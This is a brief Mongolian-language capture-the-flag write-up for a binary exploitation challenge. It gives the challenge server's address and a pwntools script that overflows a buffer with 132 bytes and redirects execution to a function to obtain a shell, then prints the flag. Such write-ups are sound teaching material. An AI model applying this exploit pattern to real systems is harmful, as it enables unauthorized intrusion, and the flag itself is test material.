## not used

`nc 218.100.84.106 9006` дээр хавсралт дээрх elf ажиллаж байна.

> **By reamb**

## Writeup

Мөн л өмнөх даалгавартай төстэй.

```python
from pwn import *

# 218.100.84.106 9006
r = remote('218.100.84.106', 9006)

nop = shellcraft.i386.nop()
call_me_sys_call_add = 0x080484ea

r.send((b'A' * 132) + p32(call_me_sys_call_add) + p32(0x08048629))
r.interactive()
```

Дээрх скриптийг ажиллуулахад **command line shell** (Interactive mode буюу`/bin/bash`) рүү орно.
Эндээс `ls`, `cat` коммандуудыг ашиглан тугийг харах боломжтой.

```
Туг: HZ{r3t2l1b_w1ns!!}
```

